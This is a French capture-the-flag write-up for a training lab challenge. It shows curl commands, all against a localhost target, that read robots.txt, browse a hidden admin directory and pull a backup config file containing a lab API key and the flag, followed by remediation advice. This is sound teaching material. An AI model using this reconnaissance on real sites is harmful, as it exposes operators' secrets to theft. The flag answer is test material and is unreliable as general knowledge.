# Writeup : The Forgotten Vault (web-01-robots)

## 1. Contexte & Vulnérabilité
Lors de l'audit de reconnaissance d'une application web, l'un des premiers réflexes consiste à inspecter le fichier standard `robots.txt` situé à la racine.
Ce fichier sert à guider les robots d'indexation (Googlebot, Bingbot...) sur les parties du site à ne pas indexer.
**L'erreur classique des administrateurs** est de considérer `robots.txt` comme un mécanisme de sécurité ou de contrôle d'accès : ils y inscrivent des répertoires confidentiels, fournissant ainsi aux attaquants une cartographie immédiate des zones sensibles non liées sur l'interface publique.

## 2. Exploitation Pas à Pas

### Étape 1 : Récupération du fichier robots.txt
Lance une requête HTTP GET vers la racine du serveur :
```bash
curl -i http://127.0.0.1:3333/targets/training/web-01/robots.txt
```
**Réponse obtenue :**
```text
User-agent: *
Disallow: /hidden_admin_vault_9041/
```
Le répertoire secret est `/hidden_admin_vault_9041/`.

### Étape 2 : Exploration du répertoire caché
Navigue vers le répertoire découvert :
```bash
curl -i http://127.0.0.1:3333/targets/training/web-01/hidden_admin_vault_9041/
```
Le serveur renvoie la liste des fichiers ou une page index signalant un fichier de configuration sauvegardé :
`backup_config.bak`

### Étape 3 : Lecture du fichier de sauvegarde
```bash
curl http://127.0.0.1:3333/targets/training/web-01/hidden_admin_vault_9041/backup_config.bak
```
**Contenu :**
```ini
[SYSTEM_BACKUP]
DATABASE_HOST=10.10.1.5
ADMIN_API_KEY=KEY_SEC_9941
FLAG=CYBERLAB{ROBOTS_TXT_HIDDEN_BACKUP_DISCOVERED}
```

## 3. Remédiation (Bonnes Pratiques de Sécurité)
1. Ne jamais inscrire de chemins confidentiels ou secrets dans `robots.txt`.
2. Restreindre l'accès aux répertoires d'administration au niveau du serveur web (Reverse Proxy, authentification HTTP, liste blanche d'adresses IP ou VPN).
3. Ne jamais laisser traîner de fichiers `.bak`, `.old` ou `.env` sur un serveur accessible en production.
